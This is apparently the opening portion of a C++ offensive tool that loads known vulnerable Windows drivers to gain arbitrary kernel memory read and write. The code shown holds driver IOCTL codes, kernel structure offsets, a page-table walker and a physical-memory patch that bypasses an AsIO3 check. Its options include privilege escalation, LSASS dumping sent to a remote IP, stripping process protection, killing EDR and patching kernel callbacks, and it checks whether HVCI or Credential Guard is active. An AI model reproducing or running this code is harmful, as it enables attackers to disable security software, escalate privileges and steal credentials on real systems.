#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <string>
#include <vector>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <algorithm>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "advapi32.lib")

typedef unsigned long long QWORD;
typedef LONG NTSTATUS;

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0)
#endif

typedef struct _UNICODE_STRING_W {
    USHORT Length;
    USHORT MaximumLength;
    LPWSTR Buffer;
} UNICODE_STRING_W, *PUNICODE_STRING_W;

typedef NTSTATUS(NTAPI* NtLoadDriver_t)(PUNICODE_STRING_W RegistryPath);
typedef NTSTATUS(NTAPI* NtUnloadDriver_t)(PUNICODE_STRING_W RegistryPath);

static NtLoadDriver_t   g_NtLoadDriver   = nullptr;
static NtUnloadDriver_t g_NtUnloadDriver = nullptr;

enum class ProviderType { BiosTool, Ktapi, PdfwKrnl, IocDrv, AsIO3, NTIOLib, RtsPpx, RwDrv };

struct Config {
    ProviderType type         = ProviderType::BiosTool;
    std::string  drvPath;
    bool         dryRun       = false;
    bool         testRw       = false;
    bool         doPrivEsc    = false;
    bool         doDump       = false;
    bool         doDumpRpm    = false;
    bool         doDumpKernel = false;
    bool         doDumpTcp    = false;
    bool         doPatchCallbacks  = false;
    bool         doListCallbacks   = false;
    bool         doListProcs       = false;
    bool         doPplStrip   = false;
    bool         doPplAdd     = false;
    bool         killEdr      = false;
    bool         doKillPid    = false;
    bool         doDecode     = false;
    bool         noXor        = false;
    bool         verbose      = false;
    bool         doCheckSecurity   = false;
    bool         doCleanupOnly     = false;
    bool         forceUnsafe       = false;
    std::string  outPath;
    std::string  inPath;
    std::string  recvIp;
    int          recvPort     = 9999;
    DWORD        targetPid    = 0;
    BYTE         xorKey       = 0x55;
    std::string  patchDrvPath;   // secondary driver for AsIO3 IRP_MJ_CREATE bypass
    std::string  patchDrvType;   // iocdrv | biostool | ktapi
};

static bool g_verbose = false;

struct KernelOffsets {
    ULONG64 UniqueProcessId    = 0;
    ULONG64 ActiveProcessLinks = 0;
    ULONG64 ImageFileName      = 0;
    ULONG64 Protection         = 0;
    ULONG64 Token              = 0;
};
static KernelOffsets g_off;

static void SetOffsetsByBuild(DWORD build) {
    g_off.UniqueProcessId    = 0x440;
    g_off.ActiveProcessLinks = 0x448;
    if (build >= 26100) {
        g_off.Token         = 0x248;
        g_off.Protection    = 0x5FA;
        g_off.ImageFileName = 0x338;
    } else if (build >= 22000) {
        g_off.Token         = 0x4B8;
        g_off.Protection    = 0x87A;
        g_off.ImageFileName = 0x5A8;
    } else if (build >= 19041) {
        g_off.Token         = 0x4B8;
        g_off.Protection    = 0x87A;
        g_off.ImageFileName = 0x5A8;
    } else if (build >= 18362) {
        g_off.Token         = 0x360;
        g_off.Protection    = 0x6FA;
        g_off.ImageFileName = 0x450;
    } else {
        g_off.Token         = 0x358;
        g_off.Protection    = 0x6CA;
        g_off.ImageFileName = 0x448;
    }
    if (g_verbose)
        printf("[*] Build %lu: UniqueProcessId=0x%llX APL=0x%llX FileName=0x%llX Protection=0x%llX Token=0x%llX\n",
            build, g_off.UniqueProcessId, g_off.ActiveProcessLinks,
            g_off.ImageFileName, g_off.Protection, g_off.Token);
}

static DWORD GetWindowsBuild() {
    HKEY hk;
    DWORD build = 0, sz = sizeof(build);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        0, KEY_READ, &hk) == ERROR_SUCCESS) {
        RegQueryValueExA(hk, "CurrentBuildNumber", nullptr, nullptr,
            (LPBYTE)&build, &sz);
        if (!build) {
            char buf[16]{};
            sz = sizeof(buf);
            if (RegQueryValueExA(hk, "CurrentBuildNumber", nullptr, nullptr,
                (LPBYTE)buf, &sz) == ERROR_SUCCESS)
                build = (DWORD)atol(buf);
        }
        RegCloseKey(hk);
    }
    return build;
}

static bool EnablePrivilege(const char* privName) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    LUID luid{};
    bool ok = false;
    if (LookupPrivilegeValueA(nullptr, privName, &luid)) {
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr)
            && GetLastError() == ERROR_SUCCESS;
    }
    CloseHandle(hToken);
    return ok;
}

struct SecurityStatus {
    bool vbsEnabled          = false;
    bool hvciEnabled         = false;
    bool credGuardEnabled    = false;
    bool secureBootEnabled   = false;
    bool driverBlocklistOn   = false;
    std::string warnings;
};

static SecurityStatus CheckSecurityFeatures() {
    SecurityStatus s;
    
    HKEY hk;
    DWORD val = 0, sz = sizeof(val);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hk, "VirtualizationBasedSecurityStatus", nullptr, nullptr,
            (LPBYTE)&val, &sz) == ERROR_SUCCESS && val >= 2) {
            s.vbsEnabled = true;
        }
        RegCloseKey(hk);
    }

    val = 0; sz = sizeof(val);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
        0, KEY_READ, &hk) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hk, "Enabled", nullptr, nullptr, (LPBYTE)&val, &sz) == ERROR_SUCCESS && val) {
            s.hvciEnabled = true;
        }
        RegCloseKey(hk);
    }

    val = 0; sz = sizeof(val);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\CredentialGuard",
        0, KEY_READ, &hk) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hk, "Enabled", nullptr, nullptr, (LPBYTE)&val, &sz) == ERROR_SUCCESS && val) {
            s.credGuardEnabled = true;
        }
        RegCloseKey(hk);
    }

    val = 0; sz = sizeof(val);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\Lsa", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hk, "LsaCfgFlags", nullptr, nullptr, (LPBYTE)&val, &sz) == ERROR_SUCCESS && val) {
            s.credGuardEnabled = true;
        }
        RegCloseKey(hk);
    }

    val = 0; sz = sizeof(val);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hk, "UEFISecureBootEnabled", nullptr, nullptr, (LPBYTE)&val, &sz) == ERROR_SUCCESS && val) {
            s.secureBootEnabled = true;
        }
        RegCloseKey(hk);
    }

    val = 0; sz = sizeof(val);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\CI\\Config", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hk, "VulnerableDriverBlocklistEnable", nullptr, nullptr, (LPBYTE)&val, &sz) == ERROR_SUCCESS && val) {
            s.driverBlocklistOn = true;
        }
        RegCloseKey(hk);
    }

    if (s.hvciEnabled) {
        s.warnings += "[!] HVCI active - kernel writes may BSOD or fail silently\n";
    }
    if (s.credGuardEnabled) {
        s.warnings += "[!] Credential Guard active - LSASS secrets are VBS-isolated, dump will be empty\n";
    }
    if (s.driverBlocklistOn) {
        s.warnings += "[!] Driver blocklist enabled - known vulnerable drivers may fail to load\n";
    }
    if (s.vbsEnabled && !s.hvciEnabled && !s.credGuardEnabled) {
        s.warnings += "[*] VBS enabled but HVCI/CG not detected - kernel writes should work\n";
    }
    
    return s;
}

static void PrintSecurityStatus(const SecurityStatus& s) {
    printf("\n=== Windows Security Feature Status ===\n");
    printf("  VBS (Virtualization-Based Security): %s\n", s.vbsEnabled ? "ENABLED" : "disabled");
    printf("  HVCI (Hypervisor Code Integrity):    %s\n", s.hvciEnabled ? "ENABLED" : "disabled");
    printf("  Credential Guard:                    %s\n", s.credGuardEnabled ? "ENABLED" : "disabled");
    printf("  Secure Boot:                         %s\n", s.secureBootEnabled ? "ENABLED" : "disabled");
    printf("  Vulnerable Driver Blocklist:         %s\n", s.driverBlocklistOn ? "ENABLED" : "disabled");
    printf("\n");
    if (!s.warnings.empty()) {
        printf("%s\n", s.warnings.c_str());
    }
    if (!s.hvciEnabled && !s.credGuardEnabled) {
        printf("[+] System is compatible with BYOVD kernel operations\n\n");
    }
}

static std::wstring g_svcName;
static std::wstring g_regPath;
static std::wstring g_dropPath;

static std::wstring Utf8ToWide(const std::string& s) {
    if (s.empty()) return {};
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
    std::wstring w(n, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, w.data(), n);
    return w;
}

static std::string WideToUtf8(const std::wstring& w) {
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string s(n, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, s.data(), n, nullptr, nullptr);
    return s;
}

static std::wstring SvcNameFromPath(const std::wstring& path) {
    auto pos = path.rfind(L'\\');
    std::wstring base = (pos == std::wstring::npos) ? path : path.substr(pos + 1);
    auto dot = base.rfind(L'.');
    if (dot != std::wstring::npos) base = base.substr(0, dot);
    return base;
}

static std::wstring RandomDropName() {
    static const wchar_t kChars[] = L"abcdefghijklmnopqrstuvwxyz0123456789";
    BYTE rnd[8]{};
    HCRYPTPROV prov = 0;
    if (CryptAcquireContextW(&prov, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        CryptGenRandom(prov, sizeof(rnd), rnd);
    else
        for (int i = 0; i < 8; i++) rnd[i] = (BYTE)(GetTickCount() ^ GetCurrentProcessId() ^ i);
    if (prov) CryptReleaseContext(prov, 0);
    std::wstring name;
    for (int i = 0; i < 8; i++)
        name += kChars[rnd[i] % 36];
    return name;
}

static bool CopyDriverToTemp(const std::wstring& srcPath, std::wstring& outDest) {
    wchar_t temp[MAX_PATH]{};
    GetTempPathW(MAX_PATH, temp);
    std::wstring name = RandomDropName() + L".sys";
    outDest = std::wstring(temp) + name;
    wchar_t srcFull[MAX_PATH]{}, dstFull[MAX_PATH]{};
    GetFullPathNameW(srcPath.c_str(), MAX_PATH, srcFull, nullptr);
    GetFullPathNameW(outDest.c_str(), MAX_PATH, dstFull, nullptr);
    if (_wcsicmp(srcFull, dstFull) == 0) return true;
    if (!CopyFileW(srcPath.c_str(), outDest.c_str(), FALSE)) {
        printf("[-] CopyFile failed (%lu)\n", GetLastError());
        return false;
    }
    return true;
}

#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")

struct KnownDriver {
    const char* hashHex;
    const char* label;
    ProviderType type;
};
static const KnownDriver kKnownDrivers[] = {
    {"", "BiosToolCommonDriver (unknown build)", ProviderType::BiosTool},
    {"", "PdFwKrnl (Trend Micro)", ProviderType::PdfwKrnl},
    {"", "ktapi (Insyde)", ProviderType::Ktapi},
    {nullptr, nullptr, ProviderType::BiosTool}
};

static std::string Sha256File(const std::wstring& path) {
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return {};
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    std::string out;
    if (!CryptAcquireContextA(&hProv, nullptr, nullptr, PROV_RSA_AES,
                              CRYPT_VERIFYCONTEXT)) { CloseHandle(h); return {}; }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0); CloseHandle(h); return {};
    }
    BYTE buf[8192];
    DWORD n = 0;
    while (ReadFile(h, buf, sizeof(buf), &n, nullptr) && n > 0) {
        if (!CryptHashData(hHash, buf, n, 0)) break;
    }
    BYTE digest[32]; DWORD dlen = sizeof(digest);
    if (CryptGetHashParam(hHash, HP_HASHVAL, digest, &dlen, 0)) {
        char hex[65] = {0};
        for (DWORD i = 0; i < dlen; i++) sprintf(hex + i*2, "%02x", digest[i]);
        out = hex;
    }
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    CloseHandle(h);
    return out;
}

static bool VerifyDriverHash(const std::wstring& path, ProviderType expected,
                             bool force) {
    std::string hash = Sha256File(path);
    if (hash.empty()) {
        printf("[!] Could not hash driver file\n");
        return force;
    }
    printf("[*] Driver SHA-256: %s\n", hash.c_str());

    bool anyPopulated = false;
    for (const KnownDriver* d = kKnownDrivers; d->hashHex; d++) {
        if (d->hashHex[0]) anyPopulated = true;
        if (d->hashHex[0] && hash == d->hashHex) {
            if (d->type != expected) {
                printf("[!] Driver identified as '%s' but --driver-type is different\n", d->label);
                printf("    Continue? use --force-unsafe to override.\n");
                return force;
            }
            printf("[+] Driver recognized: %s\n", d->label);
            return true;
        }
    }
    if (!anyPopulated) {
        printf("[*] Driver hash allowlist is empty; skipping validation\n");
        return true;
    }
    printf("[!] Driver hash NOT in known-good allowlist\n");
    printf("    This may be the wrong driver, wrong version, or tampered.\n");
    printf("    Continue with --force-unsafe if you trust this file.\n");
    return force;
}


static bool CreateDriverService(const std::wstring& svcName, const std::wstring& sysPath) {
    std::wstring ntPath  = L"\\??\\" + sysPath;
    std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + svcName;
    HKEY hk;
    LONG rc = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, nullptr,
        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, nullptr, &hk, nullptr);
    if (rc != ERROR_SUCCESS) { printf("[-] RegCreateKey failed (%ld)\n", rc); return false; }
    DWORD type = 1, start = 3, err = 1;
    RegSetValueExW(hk, L"Type",         0, REG_DWORD, (BYTE*)&type,  sizeof(type));
    RegSetValueExW(hk, L"Start",        0, REG_DWORD, (BYTE*)&start, sizeof(start));
    RegSetValueExW(hk, L"ErrorControl", 0, REG_DWORD, (BYTE*)&err,   sizeof(err));
    RegSetValueExW(hk, L"ImagePath",    0, REG_EXPAND_SZ,
        (BYTE*)ntPath.c_str(), (DWORD)((ntPath.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(hk);
    return true;
}

static bool LoadDriverViaNt(const std::wstring& regPath) {
    UNICODE_STRING_W us{};
    us.Buffer        = (LPWSTR)regPath.c_str();
    us.Length        = (USHORT)(regPath.size() * sizeof(wchar_t));
    us.MaximumLength = us.Length + sizeof(wchar_t);
    NTSTATUS st = g_NtLoadDriver(&us);
    if (!NT_SUCCESS(st)
        && st != (LONG)0xC000010E   /* STATUS_IMAGE_ALREADY_LOADED */
        && st != (LONG)0xC0000035   /* STATUS_OBJECT_NAME_COLLISION: device already registered */
    ) {
        printf("[-] NtLoadDriver failed: 0x%08lX\n", st);
        return false;
    }
    printf("[+] NtLoadDriver: 0x%08lX\n", st);
    return true;
}

static bool UnloadDriverViaNt(const std::wstring& regPath) {
    if (!g_NtUnloadDriver) return false;
    UNICODE_STRING_W us{};
    us.Buffer        = (LPWSTR)regPath.c_str();
    us.Length        = (USHORT)(regPath.size() * sizeof(wchar_t));
    us.MaximumLength = us.Length + sizeof(wchar_t);
    NTSTATUS st = g_NtUnloadDriver(&us);
    printf("[*] NtUnloadDriver: 0x%08lX\n", st);
    return NT_SUCCESS(st);
}

static void DeleteServiceKey(const std::wstring& svcName) {
    std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + svcName;
    RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath.c_str());
}

static HANDLE g_biostoolDev = INVALID_HANDLE_VALUE;

#define BIOSTOOL_READ_PHYS  0x22202Cu
#define BIOSTOOL_WRITE_PHYS 0x222030u
#define BIOSTOOL_VA2PA      0x222034u

static PVOID BiosTool_Va2Pa(PVOID va) {
    struct { PVOID VA; PVOID PA; } req{va, nullptr};
    DWORD ret = 0;
    if (!DeviceIoControl(g_biostoolDev, BIOSTOOL_VA2PA,
        &req, sizeof(req), &req, sizeof(req), &ret, nullptr))
        return nullptr;
    return req.PA;
}

static bool BiosTool_ReadPhys(PVOID pa, SIZE_T size, PVOID buf) {
    auto pCurPA  = (PUCHAR)pa;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG_PTR pageOff = (ULONG_PTR)pCurPA & 0xFFF;
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)(0x1000 - pageOff));
        struct { PVOID PA; ULONG Size; ULONG Pad; } req{pCurPA, chunk, 0};
        BYTE tmp[0x1008]{};
        DWORD got = 0;
        if (!DeviceIoControl(g_biostoolDev, BIOSTOOL_READ_PHYS,
            &req, sizeof(req), tmp, sizeof(tmp), &got, nullptr))
            return false;
        memcpy(pCurBuf, tmp + 8, chunk);
        pCurPA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool BiosTool_WritePhys(PVOID pa, SIZE_T size, PVOID data) {
    auto pCurPA   = (PUCHAR)pa;
    auto pCurData = (PUCHAR)data;
    while (size > 0) {
        ULONG_PTR pageOff = (ULONG_PTR)pCurPA & 0xFFF;
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)(0x1000 - pageOff));
        struct { ULONG Size; ULONG Pad; PUCHAR Data; PVOID PA; }
            req{ chunk, 0, pCurData, pCurPA };
        DWORD got = 0;
        if (!DeviceIoControl(g_biostoolDev, BIOSTOOL_WRITE_PHYS,
            &req, sizeof(req), &req, sizeof(req), &got, nullptr))
            return false;
        pCurPA   += chunk;
        pCurData += chunk;
        size     -= chunk;
    }
    return true;
}

static bool BiosTool_KRead(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = BiosTool_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!BiosTool_ReadPhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool BiosTool_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = BiosTool_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!BiosTool_WritePhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static HANDLE g_abiosDev = INVALID_HANDLE_VALUE;

#define ABIOS_IOCTL_READ  0x80102040u
#define ABIOS_IOCTL_WRITE 0x80102044u

static bool ABios_PhysRead(HANDLE hDev, QWORD pa, SIZE_T size, PVOID buf) {
    SIZE_T total = 16 + size;
    std::vector<BYTE> vbuf(total, 0);
    memcpy(vbuf.data() + 0, &pa,   8);
    memcpy(vbuf.data() + 8, &size, 8);
    DWORD got = 0;
    if (!DeviceIoControl(hDev, ABIOS_IOCTL_READ,
            vbuf.data(), (DWORD)total,
            vbuf.data(), (DWORD)total,
            &got, nullptr))
        return false;
    if (got < (DWORD)(16 + size)) return false;
    memcpy(buf, vbuf.data() + 16, size);
    return true;
}

static bool ABios_PhysWrite(HANDLE hDev, QWORD pa, SIZE_T size, const PVOID data) {
    SIZE_T total = 16 + size;
    std::vector<BYTE> vbuf(total, 0);
    memcpy(vbuf.data() + 0,  &pa,   8);
    memcpy(vbuf.data() + 8,  &size, 8);
    memcpy(vbuf.data() + 16, data,  size);
    DWORD got = 0;
    return !!DeviceIoControl(hDev, ABIOS_IOCTL_WRITE,
        vbuf.data(), (DWORD)total,
        vbuf.data(), (DWORD)total,
        &got, nullptr);
}

static bool ABios_Probe(HANDLE hDev) {
    BYTE probe[8] = {};
    if (!ABios_PhysRead(hDev, 0x1000ULL, sizeof(probe), probe)) return false;
    for (auto b : probe) if (b) return true;
    return false;
}

static QWORD ABios_FindAndPatchAsIO3(HANDLE hDev, bool dryRun) {
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    QWORD ramTop = ms.ullTotalPhys;
    if (ramTop > 0x200000000ULL) ramTop = 0x200000000ULL;
    ramTop = (ramTop + 0xFFF) & ~(QWORD)0xFFF;

    printf("[*] ABios physical scan: PA 0 to 0x%llX (%llu MB), page offset 0x701\n",
           ramTop, ramTop >> 20);

    static const BYTE sig[6] = {0x84, 0xC0, 0x75, 0x12, 0x8B, 0x43};

    DWORD progress = 0;
    for (QWORD pa = 0; pa < ramTop; pa += 0x1000) {
        if (++progress % 0x4000 == 0)
            printf("[*] ...scanning PA 0x%llX / 0x%llX\n", pa, ramTop);

        BYTE chunk[8] = {};
        if (!ABios_PhysRead(hDev, pa + 0x701ULL, 8, chunk)) continue;
        if (memcmp(chunk, sig, 6) != 0) continue;
        printf("[+] AsIO3 signature match at PA 0x%llX+0x701 (byte@0x703=0x%02X)\n",
               pa, chunk[2]);

        if (dryRun) return pa + 0x703ULL;

        if (chunk[2] == 0xEB) {
            printf("[+] Already patched (0xEB JMP)\n");
            return pa + 0x703ULL;
        }
        if (chunk[2] != 0x75) {
            printf("[!] Unexpected byte 0x%02X at offset 0x703, skipping\n", chunk[2]);
            continue;
        }

        BYTE pb = 0xEB;
        if (!ABios_PhysWrite(hDev, pa + 0x703ULL, 1, &pb)) {
            printf("[-] Write failed at PA 0x%llX+0x703\n", pa);
            continue;
        }
        BYTE verify = 0;
        if (!ABios_PhysRead(hDev, pa + 0x703ULL, 1, &verify) || verify != 0xEB) {
            printf("[-] Verify failed: 0x%02X\n", verify);
            continue;
        }
        printf("[+] Patched: JNE→JMP at PA 0x%llX+0x703\n", pa);
        return pa + 0x703ULL;
    }
    return 0;
}

static HANDLE g_ktapiDev = INVALID_HANDLE_VALUE;
static QWORD  g_ktapiCr3 = 0;

#define KTAPI_IOCTL_MAP   0x82007000u
#define KTAPI_IOCTL_UNMAP 0x82007100u

static PVOID Ktapi_MapPhys(PVOID pa, SIZE_T size) {
    struct { ULONG InterfaceType; ULONG BusNumber; PVOID PhysAddr; ULONG AddrSpace; ULONG Length; }
        req{ 0, 0, pa, 0, (ULONG)size };
    PVOID mapped = nullptr;
    DWORD got = 0;
    DeviceIoControl(g_ktapiDev, KTAPI_IOCTL_MAP, &req, sizeof(req),
                    &mapped, sizeof(mapped), &got, nullptr);
    return mapped;
}

static void Ktapi_UnmapPhys(PVOID mapped) {
    if (!mapped) return;
    DWORD got = 0;
    DeviceIoControl(g_ktapiDev, KTAPI_IOCTL_UNMAP, &mapped, sizeof(mapped),
                    nullptr, 0, &got, nullptr);
}

static QWORD Ktapi_FindCr3() {
    for (QWORD pa = 0; pa < 0x800000000ULL; pa += 0x1000) {
        PVOID m = Ktapi_MapPhys((PVOID)pa, 0x1000);
        if (!m) continue;
        QWORD entry = *(QWORD*)((PUCHAR)m + 0x1ED * 8);
        Ktapi_UnmapPhys(m);
        if ((entry & 1) && (entry & ~0xFFFULL) == pa)
            return pa;
    }
    return 0;
}

static QWORD Ktapi_PhysReadQword(QWORD pa) {
    QWORD v = 0;
    PVOID m = Ktapi_MapPhys((PVOID)pa, 8);
    if (m) { v = *(QWORD*)m; Ktapi_UnmapPhys(m); }
    return v;
}

static bool Ktapi_PhysRead(PVOID pa, SIZE_T size, PVOID buf) {
    auto pCurPA  = (PUCHAR)pa;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG_PTR off   = (ULONG_PTR)pCurPA & 0xFFF;
        SIZE_T    chunk = std::min(size, (SIZE_T)(0x1000 - off));
        PVOID m = Ktapi_MapPhys((PVOID)((ULONG_PTR)pCurPA & ~(ULONG_PTR)0xFFF), 0x1000);
        if (!m) return false;
        memcpy(pCurBuf, (PUCHAR)m + off, chunk);
        Ktapi_UnmapPhys(m);
        pCurPA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool Ktapi_PhysWrite(PVOID pa, SIZE_T size, PVOID data) {
    auto pCurPA   = (PUCHAR)pa;
    auto pCurData = (PUCHAR)data;
    while (size > 0) {
        ULONG_PTR off   = (ULONG_PTR)pCurPA & 0xFFF;
        SIZE_T    chunk = std::min(size, (SIZE_T)(0x1000 - off));
        PVOID m = Ktapi_MapPhys((PVOID)((ULONG_PTR)pCurPA & ~(ULONG_PTR)0xFFF), 0x1000);
        if (!m) return false;
        memcpy((PUCHAR)m + off, pCurData, chunk);
        Ktapi_UnmapPhys(m);
        pCurPA   += chunk;
        pCurData += chunk;
        size     -= chunk;
    }
    return true;
}

static QWORD Ktapi_Va2Pa(QWORD va) {
    if (!g_ktapiCr3) return 0;
    QWORD pml4_idx = (va >> 39) & 0x1FF;
    QWORD pdpt_idx = (va >> 30) & 0x1FF;
    QWORD pd_idx   = (va >> 21) & 0x1FF;
    QWORD pt_idx   = (va >> 12) & 0x1FF;
    QWORD offset   = va & 0xFFF;

    QWORD pml4e = Ktapi_PhysReadQword((g_ktapiCr3 & ~0xFFFULL) + pml4_idx * 8);
    if (!(pml4e & 1)) return 0;
    QWORD pdpte = Ktapi_PhysReadQword((pml4e & ~0xFFFULL) + pdpt_idx * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL);
    QWORD pde = Ktapi_PhysReadQword((pdpte & ~0xFFFULL) + pd_idx * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL);
    QWORD pte = Ktapi_PhysReadQword((pde & ~0xFFFULL) + pt_idx * 8);
    if (!(pte & 1)) return 0;
    return (pte & ~0xFFFULL) | offset;
}

static bool Ktapi_KRead(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        SIZE_T chunk = std::min(size, (SIZE_T)0x1000);
        QWORD pa = Ktapi_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!Ktapi_PhysRead((PVOID)pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool Ktapi_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        SIZE_T chunk = std::min(size, (SIZE_T)0x1000);
        QWORD pa = Ktapi_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!Ktapi_PhysWrite((PVOID)pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Kernel R/W - PdFwKrnl backend
// ---------------------------------------------------------------------------
static HANDLE g_pdfwDev = INVALID_HANDLE_VALUE;

#define IOCTL_AMDPDFW_MEMCPY 0x80002014

typedef struct { BYTE r[16]; PVOID Dst; PVOID Src; PVOID r2; DWORD Size; DWORD r3; } PDFW_REQ;

static bool PdfwKrnl_KRead(QWORD addr, PVOID buf, DWORD size) {
    PDFW_REQ r{}; r.Dst = buf; r.Src = (PVOID)addr; r.Size = size;
    DWORD got = 0;
    return DeviceIoControl(g_pdfwDev, IOCTL_AMDPDFW_MEMCPY, &r, sizeof(r), &r, sizeof(r), &got, nullptr);
}

static bool PdfwKrnl_KWrite(QWORD addr, PVOID buf, DWORD size) {
    PDFW_REQ r{}; r.Dst = (PVOID)addr; r.Src = buf; r.Size = size;
    DWORD got = 0;
    return DeviceIoControl(g_pdfwDev, IOCTL_AMDPDFW_MEMCPY, &r, sizeof(r), &r, sizeof(r), &got, nullptr);
}

// ---------------------------------------------------------------------------
// Kernel R/W - iOCdrv backend (Intel XTU driver, device \\.\iocbios2)
// Actual IOCTL codes from driver disassembly (iocbios2.sys, DeviceType=0x89FF, Access=3):
//   0x89ffe430: phys DWORD read  — IN: {PA:u64, Size:u32=12 bytes}  OUT: u32 (4 bytes)
//   0x89ffe434: phys DWORD write — IN: {PA:u64, Data:u64, Mask:u64=24 bytes}
// ---------------------------------------------------------------------------
static HANDLE g_iocDev  = INVALID_HANDLE_VALUE;
static QWORD  g_iocCr3  = 0;

#define IOCDRV_IOCTL_READ  0x89ffe430u
#define IOCDRV_IOCTL_WRITE 0x89ffe434u

#pragma pack(push,1)
struct IocReadReq  { QWORD PhysAddr; DWORD Size; };
struct IocWriteReq { QWORD PhysAddr; QWORD Data; QWORD Mask; };
#pragma pack(pop)

static bool IocDrv_PhysRead(QWORD pa, PVOID buf, DWORD size) {
    if (size == 0) return true;
    DWORD done = 0;
    while (done < size) {
